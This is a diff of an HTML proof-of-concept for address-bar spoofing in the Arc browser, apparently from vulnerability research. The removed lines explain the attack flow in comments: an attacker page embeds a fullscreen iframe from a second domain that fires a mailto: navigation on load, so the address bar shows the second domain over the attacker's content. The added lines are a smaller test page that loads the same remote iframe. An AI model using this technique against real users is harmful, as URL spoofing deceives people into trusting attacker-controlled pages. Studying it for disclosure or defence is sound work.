@@ -1,37 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoC</title>
-  <style>
-    * { margin: 0; padding: 0; }
-    body { overflow: hidden; }
-  </style>
-</head>
-<body>
-
-<!--
-  CORRECTED FLOW:
-  1. User opens THIS page (domain A / attacker)
-  2. victim-frame (domain B / intanjelek.github.io) loads fullscreen
-  3. iframe.html on domain B fires mailto: on load
-  4. Arc Navigation Delegate reads: origin = domain B (intanjelek.github.io)
-  5. Address bar updates to domain B while attacker content (domain A) is underneath
-
-  KEY FIX: Remove the srcdoc attack-frame (wrong origin).
-  The trigger must come FROM domain B iframe, not domain A srcdoc.
-  So iframe.html on domain B must contain the URI scheme trigger.
--->
-
-<!-- Fullscreen victim iframe (domain B) — THIS is what triggers the spoof -->
-<!-- iframe.html on domain B must fire: location.href = 'mailto:a@b.com' on load -->
-<iframe
-  id="victim-frame"
-  src="https://intanjelek.github.io/spoof/iframe.html"
-  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;"
-  sandbox="allow-scripts allow-same-origin allow-top-navigation-by-user-activation allow-forms"
-></iframe>
-
-</body>
-</html>
+<!DOCTYPE html><html><body>
+<h1>VICTIM top-level (origin A) — konten yang dirender</h1>
+<p>Top-level origin: <b id="o"></b></p>
+<iframe src="https://intanjelek.github.io/spoof/iframe.html"
+        style="width:1px;height:1px;border:0"></iframe>
+<script>document.getElementById('o').textContent = location.origin;</script>
+</body></html>
